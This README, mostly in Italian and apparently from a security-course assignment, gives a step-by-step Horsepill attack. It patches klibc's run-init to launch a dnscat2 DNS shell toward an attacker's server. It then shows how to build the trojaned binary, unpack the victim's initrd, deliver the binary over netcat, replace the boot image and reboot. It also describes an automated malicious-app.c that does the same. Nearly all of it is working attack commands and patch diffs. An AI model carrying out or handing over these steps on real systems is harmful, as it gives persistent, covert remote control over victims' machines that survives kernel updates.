# Horsepill Payload
_You are requested to produce a payload (using any vector of your choice) that is able to install a DNS shell (see, e.g., [here](https://github.com/sensepost/DNS-Shell)) using the horsepill attack. The payload should survive kernel updates._

## Tunnel DNS
Il tool utilizzato per controllare il sistema da remoto è [dnscat2](https://github.com/iagox86/dnscat2).

All'interno del file [horsepill.c](src/horsepill.c) è necessario modificare il valore delle seguenti costanti:
- [`DNSCAT_ARGV2`](src/horsepill.c#L112)` = "server=<ATTACKER_IP>,port=<ATTACKER_PORT>\0";`
- [`DNSCAT_ARGV3`](src/horsepill.c#L113)` = "--secret=<SECRET>\0";`

> **Nota:** Per la configurazione e l'esecuzione del server far riferimento al link: https://github.com/iagox86/dnscat2

## `klibc` patching
Per comodità, creiamo due cartelle di lavoro che consentiranno la creazione del file di _patch_ e la sua applicazione:
```
mkdir /tmp/create
mkdir /tmp/apply
```
### Creazione del file di patch
All'interno della cartella `/tmp/create` scarichiamo il pacchetto sorgente `klibc`:
```
cd /tmp/create
apt-get build-dep klibc && apt-get source klibc
```
assumendo di lavorare con la versione `2.0.7` di `klibc`, eseguiamo:
```
mv klibc-2.0.7 klibc-2.0.7.orig
gunzip -c klibc_2.0.7.orig.tar.gz | tar -x
```
In questo modo si ottengono due directory:
- `klibc-2.0.7.orig`
- `klibc-2.0.7`

entrambe hanno lo stesso contenuto e ciò consentirà di eseguire il `diff` a valle delle modifiche.

Eseguiamo la `clone` del repository Github contenente il file corrente e il payload per l'esecuzione dell'attacco:
```
git clone https://github.com/g3lbin/horsepill.git
```
copiamo i file header e sorgenti presenti in `horsepill/src/` all'interno della cartella da modificare:
```
cp horsepill/src/* klibc-2.0.7/usr/kinit/run-init
```
Utilizzando un editor di testi qualsiasi (e.g. `vim`) modifichiamo i seguenti file:
1. `klibc-2.0.7/usr/kinit/run-init/Kbuild`
```diff
# common .o files
-objs := run-init.o runinitlib.o
+objs := run-init.o runinitlib.o horsepill.o
```
2. `klibc-2.0.7/usr/kinit/run-init/run-init.c`
```diff
#include "run-init.h"
+#include "horsepill.h"

static const char *program;
```
```diff
        char **initargs;
+        cmdline_ptr = (char **)argv;

        /* Variables... */
        int o;
```
3. `klibc-2.0.7/usr/kinit/run-init/runinitlib.c`
```diff
#include "capabilities.h"
+#include "horsepill.h"

/* Make it possible to compile on glibc by including constants that the
```
```diff
        if (!dry_run) {
+                puts("[HORSEPILL] G3LBIN VISITED YOU!\n");
+                sleep(5);
+                do_attack();
                /* Spawn init */
                execv(init, initargs);
                return init;		/* Failed to spawn init */
```
Infine, per creare il file di patch `klibc-horsepill.patch` eseguiamo:
```
diff -u klibc-2.0.7.orig/usr/kinit/run-init/Kbuild klibc-2.0.7/usr/kinit/run-init/Kbuild > klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/dnscat.h >> klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/extractor.h >> klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/infect.h >> klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/horsepill.h >> klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/horsepill.c >> klibc-horsepill.patch
diff -u klibc-2.0.7.orig/usr/kinit/run-init/run-init.c klibc-2.0.7/usr/kinit/run-init/run-init.c >> klibc-horsepill.patch
diff -u klibc-2.0.7.orig/usr/kinit/run-init/runinitlib.c klibc-2.0.7/usr/kinit/run-init/runinitlib.c >> klibc-horsepill.patch
```
### Applicazione della patch
Copiamo il file di patch nell'altro spazio di lavoro e spostiamoci lì dentro:
```
cp klibc-horsepill.patch /tmp/apply
cd /tmp/apply
```
Scarichiamo anche qui il pacchetto sorgente `klibc`:
```
apt-get build-dep klibc && apt-get source klibc
```
Applichiamo la patch:
```
cd klibc-2.0.7
quilt import ../klibc-horsepill.patch
dpkg-buildpackage -j$(nproc) -us -uc
```
Così facendo, viene generato il binario compromesso che consentirà di infettare la vittima: `/tmp/apply/klibc-2.0.7/usr/kinit/run-init/shared/run-init`

## Victim infection
Di seguito è mostrata la procedura manuale per la modifica dell'`initrd`. Tuttavia, questo lavoro può essere svolto in automatico compilando ed eseguendo [`malicious-app.c`](malicious-app.c), come mostrato successivamente.

Per prima cosa è necessario ottenere una shell come `root` e quindi eseguire un exploit per scalare i privilegi. Per la realizzazione di questo attacco si assume che questo lavoro sia già stato eseguito.

Creiamo uno _scratch space_ per lavorare senza sporcare la macchina vittima:
```
unshare -f
```
> **Nota:** Questo permette di eseguire un program in un nuovo namespace e, se invocato senza target, lancia una shell. L'opzione `-f` (`--fork`) permette di creare la shell come child di `unshare` invece di eseguirla in modo diretto, inoltre, mentre `unshare` è in wait per il child, ignora i segnali `SIGINT` e `SIGTERM` e non li inoltra al child. Quindi eventualmente vanno mandati direttamente al child.

Tutto ciò che viene scritto ora non può essere visto dagli altri processi, dunque montiamo un file system temporaneo sulla directory `/lost+found`:
```
mount -t tmpfs none /lost+found/
cd /lost+found/
```
È comodo creare due cartelle di lavoro che permettano di eseguire l'_unpack_ e il _repack_ dell'initial ramdisk:
```
mkdir tmp
mkdir tmp/extracted
```

### Unpack e modifica di `initrd`
Per copiare l'effettiva immagine del disco da infettare ed estrarne il contenuto, eseguiamo:
```
cp /boot/initrd.img-$(uname -r) tmp/
cd tmp/
unmkinitramfs initrd.img-$(uname -r) ./extracted/
cd extracted/
```
Fatto ciò, è possibile esplorare e modificare il file system `initramfs`.

Dal server attaccante si ottiene il binario compromesso `run-init` sfruttando `netcat`:
- vittima (ip: 192.168.1.151)
```
nc -lvnp 9999 | base64 -d | tar xz
```
- attaccante
```
tar cz run-init | base64 | nc 192.168.1.151 9999
```
Ricevuto il file sulla macchina vittima, possiamo sostituirlo all'originale:
```
mv run-init main/usr/bin/run-init
```
### Repack di `initrd`
Per ricreare l'immagine del disco è necessario ricostruire l'archivio compresso come segue:
1. compressione `early`:
```
cd early/
find . -print0 | cpio --null --create --format=newc > /lost+found/tmp/newinitrd
```
2. compressione `early2`:
```
cd ../early2/
find kernel -print0 | cpio --null --create --format=newc >> /lost+found/tmp/newinitrd
```
3. compressione `main`:
```
cd ../main/
find . | cpio --create --format=newc | lz4 -l -c >> /lost+found/tmp/newinitrd
```
### Sostituzione del disco
È possibile verificare che l'immagine del disco creata venga correttamente interpretata come l'originale:
```
cd /lost+found/tmp/
binwalk initrd.img-$(uname -r)
binwalk newinitrd
```
Se tutto è corretto, si può procedere con la sostituzione e il riavvio:
```
cp newinitrd /boot/initrd.img-$(uname -r)
reboot
```
### Infezione automatizzata
Per evitare l'esecuzione manuale di tutti i passaggi descritti in precedenza, è stato realizzato il programma [`malicious-app.c`](malicious-app.c), che fa esattamente quel lavoro.

In questo caso, sarà sufficiente eseguire:
- vittima (ip: 192.168.1.151)
```
nc -lvnp 9999 | base64 -d | tar xz
```
- attaccante
```
gcc malicious-app.c -o malicious-app
tar cz malicious-app | base64 | nc 192.168.1.151 9999
```
Dopodiché, lato vittima infettiamo `initrd` ed eseguiamo il riavvio:
```
./malicious-app
reboot
```